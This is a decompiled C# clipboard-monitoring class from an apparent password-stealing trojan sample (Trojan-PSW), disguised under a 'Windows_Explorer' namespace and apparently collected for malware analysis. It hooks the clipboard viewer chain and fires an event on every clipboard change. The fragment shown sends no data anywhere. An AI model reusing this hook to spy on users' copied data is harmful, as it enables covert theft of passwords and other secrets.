// Decompiled with JetBrains decompiler
// Type: Windows_Explorer.Clipboard
// Assembly: wqeqerwt4354wsey56sey5ts765y54, Version=7.52.5.2, Culture=neutral, PublicKeyToken=null
// MVID: 3FC4189E-BF6F-40C3-B48B-A4DA54DCDC94
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Trojan-PSW.Win32.VB.chm-8bf17b67595d474959c887391b17692103cd2a30a4e2cd4f51f483ad8140b647.exe

using System;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace Windows_Explorer
{
  internal class Clipboard : NativeWindow
  {
    private IntPtr ID;

    [DllImport("user32", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetClipboardViewer(IntPtr handle);

    [DllImport("user32", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern bool ChangeClipboardChain(IntPtr handle, IntPtr next);

    [DllImport("user32", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern long SendMessage(IntPtr handle, int code, IntPtr flags, IntPtr data);

    public event Clipboard.ChangedEventHandler Changed;

    public Clipboard() => this.CreateHandle(new CreateParams());

    public void Install() => this.ID = Clipboard.SetClipboardViewer(this.Handle);

    public void Uninstall() => Clipboard.ChangeClipboardChain(this.Handle, this.ID);

    protected override void WndProc(ref Message m)
    {
      switch (m.Msg)
      {
        case 776:
          Clipboard.ChangedEventHandler changedEvent = this.ChangedEvent;
          if (changedEvent != null)
            changedEvent(this);
          Clipboard.SendMessage(this.ID, m.Msg, m.WParam, m.LParam);
          break;
        case 781:
          if (m.WParam == this.ID)
          {
            this.ID = m.LParam;
            break;
          }
          Clipboard.SendMessage(this.ID, m.Msg, m.WParam, m.LParam);
          break;
      }
      base.WndProc(ref m);
    }

    ~Clipboard() => this.Uninstall();

    public delegate void ChangedEventHandler(Clipboard sender);
  }
}
